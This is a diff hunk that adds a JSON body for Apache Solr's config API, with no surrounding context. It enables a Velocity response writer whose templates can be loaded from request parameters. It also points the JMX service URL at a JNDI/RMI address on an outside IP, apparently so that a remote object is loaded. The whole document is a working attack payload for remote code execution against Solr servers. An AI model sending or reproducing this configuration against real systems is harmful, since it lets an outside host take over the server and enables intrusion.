@@ -1,0 +1,9 @@
+{
+  "queryResponseWriter":{"velocity":{
+      "startup":"lazy",
+      "name":"velocity",
+      "class":"solr.VelocityResponseWriter",
+      "template.base.dir":"",
+      "solr.resource.loader.enabled":"true",
+      "params.resource.loader.enabled":"true"}},
+  "props":{"jmx":{"serviceUrl":"service:jmx:rmi:///jndi/rmi://83.97.20.238:1099/obj"}}}
